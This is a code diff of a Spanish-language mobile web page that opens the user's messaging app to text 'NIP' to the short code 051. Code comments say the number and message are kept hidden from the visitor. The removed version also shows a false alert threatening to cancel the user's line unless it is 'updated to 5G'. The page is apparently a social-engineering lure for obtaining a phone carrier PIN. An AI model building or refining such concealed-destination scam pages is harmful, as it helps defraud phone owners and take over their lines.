@@ -2,72 +2,57 @@
 <html lang="es">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Enviar SMS</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-      background: url('fondo.jpg') no-repeat center center;
-      background-size: cover;
-      background-attachment: fixed;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      height:100vh;
+      margin:0;
+      background: #f5f5f5;
     }
     .container {
-      background: rgba(255, 255, 255, 0.92);
-      padding: 25px;
-      border-radius: 15px;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-      text-align: center;
-      width: 90%;
-      max-width: 350px;
+      background:#fff;
+      padding:25px;
+      border-radius:12px;
+      box-shadow:0 5px 20px rgba(0,0,0,0.1);
+      text-align:center;
+      width:90%;
+      max-width:350px;
     }
-    h1 {
-      font-size: 22px;
-      margin-bottom: 15px;
-      color: #222;
-    }
-    p {
-      font-size: 14px;
-      color: #444;
-      margin-bottom: 20px;
-    }
+    h1 { font-size:20px; margin-bottom:10px; }
+    p { font-size:14px; color:#555; margin-bottom:20px; }
     .btn {
-      display: inline-block;
-      padding: 14px 22px;
-      background: #ff1a1a;
-      color: #fff;
-      text-decoration: none;
-      font-size: 16px;
-      border-radius: 10px;
-      transition: background 0.3s ease;
-      font-weight: bold;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      display:inline-block;
+      padding:12px 20px;
+      background:#007bff;
+      color:#fff;
+      text-decoration:none;
+      font-size:16px;
+      border-radius:8px;
+      transition: background 0.3s;
     }
-    .btn:hover {
-      background: #cc0000;
-    }
+    .btn:hover { background:#0056b3; }
     .warning {
-      color: #b33;
-      font-size: 13px;
-      margin-top: 8px;
-      display: none;
+      color:#b33;
+      font-size:13px;
+      margin-top:8px;
+      display:none;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Verificación vía SMS</h1>
-    <p>Presiona el botón para continuar con la verificación.</p>
+    <h1>Enviar NIP por SMS</h1>
+    <p>Haz clic en el botón para abrir tu app de mensajes y enviar el NIP.</p>
 
-    <!-- Enlace SMS ocultando el número y mensaje -->
-    <a id="smsLink" class="btn" href="sms:051?body=Nip">📩 Continuar</a>
+    <a id="smsLink" class="btn" href="#">Enviar SMS</a>
 
     <div id="warning" class="warning">
-      Este enlace solo funciona en dispositivos móviles.
+      Es posible que el enlace no funcione en PC. Usa tu teléfono para enviar el SMS.
     </div>
   </div>
 
@@ -75,12 +60,25 @@
     function isMobile() {
       return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
     }
-    if (!isMobile()) {
-      document.getElementById('warning').style.display = 'block';
+    function isIOS() {
+      return /iPhone|iPad|iPod/i.test(navigator.userAgent);
     }
 
-    // Alerta al entrar
-    alert("⚠️ Actualice su línea a 5G o será dada de baja.");
+    const link = document.getElementById('smsLink');
+
+    // Número y mensaje solo en el código, no visible en la página
+    const numero = "051";
+    const mensaje = "nip";
+
+    if (!isMobile()) {
+      document.getElementById('warning').style.display = 'block';
+    } else {
+      if (isIOS()) {
+        link.href = `sms:${numero}&body=${mensaje}`; // formato para iPhone
+      } else {
+        link.href = `sms:${numero}?body=${mensaje}`; // formato para Android
+      }
+    }
   </script>
 </body>
 </html>
